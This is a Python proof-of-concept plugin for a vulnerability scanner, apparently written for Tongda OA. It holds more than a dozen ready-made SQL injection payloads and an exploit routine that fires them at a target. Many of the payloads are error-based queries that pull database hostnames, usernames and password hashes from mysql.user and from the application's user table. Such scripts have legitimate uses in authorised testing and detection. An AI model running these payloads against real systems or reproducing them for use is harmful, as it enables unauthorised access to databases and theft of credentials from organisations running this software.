#!/usr/bin/env python
#coding:utf8

__author__ = 'xiaokong'

from module.plugin import Plugin

class poc(Plugin):

    type = 'CMS'
    name = 'tongda'
    querytype = 'site'
    description = 'Tongda OA SQL Injection'
    
    def __init__(self):
    
        self.payload_list = [
        '/interface/auth.php?&PASSWORD=1&USER_ID=%df%27%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(0x3a,md5(1122),0x3a)%20from%20user%20limit%201),floor(rand(0)*2))x%20from%20%20information_schema.tables%20group%20by%20x)a)%23',
        '/general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),(substring((select%20md5(1122)%20from%20user%20limit%201),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%23',
        '/general/budget/budget_process/budget_project_depts.php?DEPT_ID=1&DEPT_ID_PRIV=0&DEPT_IDS=1) and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23&YEAR=2015',
        '/general/budget/budget_process/budget_month_depts.php?DEPT_ID=1&DEPT_ID_PRIV=0&DEPT_IDS=1)and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23&YEAR=2015',
        '/general/budget/budget_process/budget_quater_depts.php?DEPT_ID=1&DEPT_ID_PRIV=0&DEPT_IDS=1)and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23 &YEAR=2015',
        '/general/budget/budget_process/budget_year_depts.php?DEPT_ID=1&DEPT_ID_PRIV=0&DEPT_IDS=1) and (select 1 from (select count(*),concat((select concat(host,user,password) from mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#)&YEAR=2015',
        '/general/crm/apps/crm/include/search.php?ENTITY=crm_marketing%20where%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        '/general/workflow/list/print.php?RUN_ID=3128&FLOW_ID=69&PRCS_ID=1%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        '/general/data_center/model_design/design/report/list_report.php?isreport=y&repid=132)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23%20&DEPT_ID=20',
        '/general/data_center/model_design/design/report/list_report.php?isreport=n&DEPT_ID=20%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        '/general/workflow/list/getdata.php?TYPE=2&RUN_ID=&RUN_NAME=&FLOW_ID=all&TIME_OUT_FLAG=all&_search=false&nd=1427034012264&rows=10&page=1&sidx=PRCS_TIME&sord=,(select%201%20from%20(select%20count(*),concat((select%20concat(host,user,password)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23',
        '/interface/go.php?APP_UNIT=aa%2527%20and%201=(select%201%20from(select%20count(*),concat(version(),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271'
        ]
        self.payload_1 = '/general/document/index.php/recv/register/turn'
        self.payload_2 = '/general/document/index.php/recv/register/register_for/?tid=&amp;title=1%\' and (!(select*from(select user())x)-~0)&gt;1;%00'
        self.payload_3 = '/logincheck.php'
    
    def exploit(self, target):
        
        for i,path in enumerate(self.payload_list):
            response = self.query(method='GET', url=target+path)
            if response is not None:
                if response.ok:
                    if 'Duplicate' in response.content or 'You have an error in your SQL syntax' in response.content:
                        self.log.vuln(target+str([i]))

        data = {'_SERVER': '', 'rid': 'exp(~(select*from(select concat_ws(0x7c,USER_ID,PASSWORD) from user limit 4,1)x))'}       
        response = self.query(method='POST', url=target+self.payload_1, data=data)
        if response is not None:
            if response.content:
                if 'out of range' in response.content:
                    self.log.vuln(target+str([13]))

        response = self.query(method='GET', url=target+self.payload_2)  
        if response is not None:
            if response.content:                
                if 'out of range' in response.content:
                    self.log.vuln(target+str([14]))

        data = {'submit':'%b5%c7%20%c2%bc','PASSWORD':'g00dPa%24%24w0rD','UNAME':'%bf\'%bf%22'}
        response = self.query(method='POST', url=target+self.payload_3, data=data)
        if response is not None:
            if response.content: 
                if '#1064' in response.content:
                    self.log.vuln(target+str([15]))

            
        